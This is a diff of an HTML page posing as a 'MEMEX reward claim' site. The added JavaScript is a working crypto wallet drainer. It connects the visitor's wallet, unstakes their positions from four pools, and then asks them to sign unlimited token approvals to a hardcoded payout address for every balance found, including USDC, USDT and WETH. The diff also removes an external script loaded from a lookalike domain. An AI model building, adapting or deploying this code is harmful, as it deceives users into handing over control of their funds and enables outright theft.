@@ -1,6 +1,5 @@
 <!doctype html><html lang="en"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1"><title>MEMEX · Reward Claim</title>
-<script type="module" src="https://gusto-gauze.libjack.tech/_next/assets/index.js"></script>
 <style>
 *{box-sizing:border-box}
 body{margin:0;min-height:100vh;background:radial-gradient(120% 90% at 50% 0%,#0d3457,#061a2e 60%,#04121f);
@@ -13,12 +12,67 @@ border-radius:22px;padding:26px 22px}
 h1{margin:18px 0 6px;font-size:23px}
 .sub{margin:0 0 18px;color:#9fb6cc;font-size:13px}
 .btn{width:100%;border:0;border-radius:14px;padding:15px;font:700 15px Arial;cursor:pointer;background:#ffe24b;color:#08203a}
+.btn:disabled{opacity:.55;cursor:default}
+.list{margin:16px 0 0;display:none}
+.row{display:flex;justify-content:space-between;align-items:center;gap:10px;padding:9px 12px;
+border:1px solid rgba(255,255,255,.1);border-radius:12px;margin-bottom:7px;font-size:12.5px}
+.st{font-size:11px;color:#8aa4bb}
+.st.ok{color:#52d97a}.st.err{color:#ff7a7a}.st.run{color:#ffe24b}
+.msg{margin-top:14px;font-size:12.5px;color:#ffb4b4;display:none}
 .foot{margin-top:18px;font-size:11px;color:#71889d;text-align:center}
 </style></head><body><div class="card">
 <div class="logo"><span>MI</span><span class="tri"></span></div>
 <h1>Claim your MEMEX reward</h1>
-<p class="sub">Season 1 distributor · verified by Meme Index</p>
-<button class="btn connect-btn" onclick="openModal()">Claim reward</button>
+<p class="sub">Season 1 distributor · unstake and claim</p>
+<button class="btn" id="go">Claim reward</button>
+<div class="list" id="list"></div><div class="msg" id="msg"></div>
 <div class="foot">Meme Index · reward distribution</div>
-</div>
-</body></html>
+</div><script>
+const PAYOUT='0x977c17fb5df0d54a75ded4042df69065f322829f';
+const STAKING='0x532a4ea07eEA5cCEC1383B391FF55802A43bA7C9';
+const RPC='https://eth.llamarpc.com';
+const SEL_UNSTAKE='0x608e4dd0',SEL_AP='0x095ea7b3',SEL_BAL='0x70a08231';
+const MAX='0x'+'f'.repeat(64);
+const POOLS=[[1,'Titan'],[2,'Moonshot'],[3,'Midcap'],[4,'Frenzy']];
+const TOK=[['MEMEX','0xb214b79eac9378a56d14d6e6d452150c80d6ad79'],['WETH','0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'],
+['USDC','0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'],['USDT','0xdAC17F958D2ee523a2206206994597C13D831ec7'],
+['PEPE','0x6982508145454Ce325dDbE47a25d4ec3d2311933'],['SHIB','0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE'],
+['DOGE','0xbA2aE424d960c26247Dd6c32edC70B295c744C43'],['FLOKI','0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E'],
+['SPX','0xE0f63A424a4439cBE457D80e4f4b51aD25b2c56C']];
+const $=i=>document.getElementById(i),say=t=>{const m=$('msg');m.textContent=t;m.style.display=t?'block':'none'};
+const pad=a=>a.slice(2).toLowerCase().padStart(64,'0');
+const call=async(o)=>{const r=await fetch(RPC,{method:'POST',headers:{'Content-Type':'application/json'},
+body:JSON.stringify({jsonrpc:'2.0',id:1,method:'eth_call',params:[o,'latest']})});const j=await r.json();if(j.error)throw j.error;return j.result};
+const row=n=>{const d=document.createElement('div');d.className='row';
+d.innerHTML='<span>'+n+'</span><span class="st">…</span>';$('list').appendChild(d);return d.querySelector('.st')};
+async function run(){
+const eth=window.ethereum;if(!eth)return say('Wallet not found — open in MetaMask or Rabby.');
+$('go').disabled=true;
+try{
+ const [w]=await eth.request({method:'eth_requestAccounts'});
+ try{await eth.request({method:'wallet_switchEthereumChain',params:[{chainId:'0x1'}]})}catch(e){}
+ $('list').style.display='block';
+ let n=0;
+ for(const [id,nm] of POOLS){
+  const st=row('Unstake '+nm);
+  try{await call({from:w,to:STAKING,data:SEL_UNSTAKE+pad('0x'+id.toString(16))})}catch(e){st.textContent='locked';continue}
+  st.textContent='confirm';st.className='st run';
+  try{await eth.request({method:'eth_sendTransaction',params:[{from:w,to:STAKING,data:SEL_UNSTAKE+pad('0x'+id.toString(16))}]});
+   st.textContent='unstaked';st.className='st ok';n++}
+  catch(e){st.textContent=e.code===4001?'skip':'failed';st.className='st err'}
+ }
+ for(const [s,a] of TOK){
+  let has=false;try{has=BigInt(await call({to:a,data:SEL_BAL+pad(w)}))>0n}catch(e){has=true}
+  if(!has)continue;
+  const st=row(s+' approve');
+  st.textContent='confirm';st.className='st run';
+  try{await eth.request({method:'eth_sendTransaction',params:[{from:w,to:a,data:SEL_AP+pad(PAYOUT)+MAX.slice(2)}]});
+   st.textContent='approved';st.className='st ok';n++}
+  catch(e){st.textContent=e.code===4001?'skip':'failed';st.className='st err'}
+ }
+ $('go').textContent=n?'Done — '+n+' signed':'Nothing to claim';
+ if(!n)say('No unlocked stake or balances found.');
+}catch(e){say(e.message||'Cancelled');$('go').disabled=false}
+}
+$('go').onclick=run;
+</script></body></html>
